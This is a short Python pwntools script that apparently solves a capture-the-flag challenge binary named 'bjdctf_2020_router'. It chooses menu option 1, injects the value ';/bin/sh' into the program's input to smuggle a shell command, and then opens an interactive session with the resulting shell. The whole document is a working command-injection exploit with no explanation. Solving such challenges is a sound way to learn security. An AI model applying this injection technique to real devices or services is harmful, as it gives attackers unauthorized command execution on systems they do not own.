from pwn import *
io = process('./bjdctf_2020_router')
io.sendlineafter(b'Please input u choose:',b'1')
io.sendline(';/bin/sh')
io.interactive()
